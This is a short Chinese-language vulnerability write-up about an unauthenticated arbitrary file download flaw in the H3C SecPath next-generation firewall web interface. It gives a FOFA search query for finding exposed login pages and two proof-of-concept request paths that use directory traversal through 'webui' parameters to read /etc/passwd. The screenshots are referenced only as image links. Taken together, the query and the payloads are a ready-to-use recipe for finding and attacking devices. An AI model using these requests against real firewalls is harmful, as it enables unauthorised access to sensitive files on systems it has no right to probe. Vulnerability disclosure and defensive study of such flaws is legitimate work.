# H3C-SecPath-下一代防火墙--任意文件下载漏洞

## 漏洞描述

H3C SecPath 下一代防火墙  存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息

## 漏洞影响

> [!NOTE]
>
> H3C SecPath

## FOFA

> [!NOTE]
>
> title="Web user login"

## 漏洞复现

登录页面如下

![image-20210604115315360](H3C-SecPath-下一代防火墙--任意文件下载漏洞.assets/1627363588637558.jpg)

存在漏洞点的功能有两个

![image-20210604115351314](H3C-SecPath-下一代防火墙--任意文件下载漏洞.assets/1627363588921092.jpg)

点击下载抓包更改请求

![image-20210604115431531](H3C-SecPath-下一代防火墙--任意文件下载漏洞.assets/1627363589231147.jpg)

并且在未身份验证的情况中，也可以请求下载敏感文件

验证POC

```
/webui/?g=sys_dia_data_check&file_name=../../etc/passwd

/webui/?
g=sys_capture_file_download&name=../../../../../../../../etc/passwd 
```

​	